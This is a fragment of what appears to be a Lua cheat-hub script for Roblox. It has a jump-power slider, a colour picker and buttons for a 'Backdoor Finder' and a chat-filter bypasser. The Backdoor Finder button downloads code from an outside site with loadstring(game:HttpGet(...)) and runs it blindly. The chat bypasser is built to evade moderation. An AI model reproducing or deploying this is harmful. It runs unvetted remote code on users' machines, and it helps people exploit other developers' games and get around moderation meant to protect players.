...
playerSection:NewSlider("Jump Power", "Changes your Jump Power from a value between 50 to 500.", 500, 50, function(s) -- 500 (MaxValue) | 0 (MinValue)
...
scriptSection:NewButton("Backdoor Finder", "Loads Backdoor.exe V4", function()
    loadstring(game:HttpGet("https://the-shed.xyz/roblox/scripts/Backdoor", true))()
end)
...
scriptSection:NewButton("Sheds Bypass", "Loads Sheds Chat Bypasser V3", function()
...
colorSection:NewColorPicker("RGB Color Picker", "Here you can change the colors of the UI", Color3.fromRGB(0,0,0), function(color)
    print(color)
   
end)

local credits = Window:NewTab("Credits")
local creditsSection = credits:NewSection("This is for the different credits")